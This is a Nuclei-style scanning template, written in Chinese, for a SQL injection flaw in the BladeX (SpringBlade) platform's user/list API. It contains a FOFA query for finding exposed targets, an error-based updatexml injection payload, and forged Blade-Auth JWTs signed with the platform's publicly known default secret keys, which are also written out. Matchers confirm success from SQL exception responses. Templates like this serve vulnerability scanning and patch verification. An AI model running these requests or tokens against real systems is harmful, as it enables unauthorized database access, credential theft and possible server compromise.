id: SpringBlade-user-list-sqli

info:
  name: BladeX企业级开发平台 user/list SQL 注入漏洞
  author: sec
  severity: high
  description: |-
    fofa: body="https://bladex.vip"
    BladeX企业级开发平台 user/list 存在sql注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

  tags: sql injection

http:
  - raw:   
      - |
        GET /api/blade-user/list?updatexml(1,concat(0x7e,user(),0x7e),1)=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        {{jwt}}
        Connection: close

    payloads:
      jwt:
        # 默认密钥：bladexisapowerfulmicroservicearchitectureupgradedandoptimizedfromacommercialproject
        - "Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ"
        # 默认密钥：BladeX
        - "Blade-Auth: bearer eyJ0eXAiOiJKc29uV2ViVG9rZW4iLCJhbGciOiJIUzI1NiJ9..tUgcE7QGzhe1nm_lT6aoMpZSdXKKNJyMBTMybd5RkWQ"
    
    attack: batteringram
    threads: 5
    stop-at-first-match: true

    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "java.sql.SQLException")'
          - 'status_code == 500'
          - 'contains(header, "application/json")'
        condition: and







